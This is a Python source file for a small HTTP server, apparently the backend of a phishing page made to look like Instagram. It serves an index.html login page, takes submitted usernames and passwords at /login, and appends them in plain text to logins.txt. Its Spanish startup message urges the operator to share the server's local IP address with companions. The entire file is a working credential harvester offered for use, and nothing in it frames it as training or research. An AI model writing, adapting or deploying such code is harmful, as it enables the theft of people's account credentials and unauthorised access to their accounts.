# server.py
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.parse
from datetime import datetime

LOG_FILE = "logins.txt"

class InstagramHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_file('index.html', 'text/html')
        else:
            self.send_error(404)

    def do_POST(self):
        if self.path == '/login':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data.decode('utf-8'))

                username = data.get('username', '').strip()
                password = data.get('password', '').strip()

                # Guardar en archivo
                with open(LOG_FILE, 'a', encoding='utf-8') as f:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    f.write(f"[{timestamp}] Usuario: {username} | Contraseña: {password}\n")

                # Responder OK
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"status": "success"}')
            except Exception as e:
                print(f"Error: {e}")
                self.send_error(500)
        else:
            self.send_error(404)

    def send_file(self, filename, content_type):
        try:
            with open(filename, 'rb') as f:
                self.send_response(200)
                self.send_header('Content-type', content_type)
                self.end_headers()
                self.wfile.write(f.read())
        except FileNotFoundError:
            self.send_error(404)

def get_local_ip():
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

if __name__ == "__main__":
    PORT = 8080
    ip = get_local_ip()
    
    print(f"\n🌐 Servidor iniciado en:")
    print(f"   → http://127.0.0.1:{PORT}")
    print(f"   → http://{ip}:{PORT}   ← ¡Comparte esta IP con tus compañeros!")
    print(f"\n📁 Los datos se guardarán en: {LOG_FILE}")
    print("🛑 Presiona CTRL+C para detener el servidor.\n")

    server = HTTPServer(('', PORT), InstagramHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Servidor detenido.")
        server.server_close()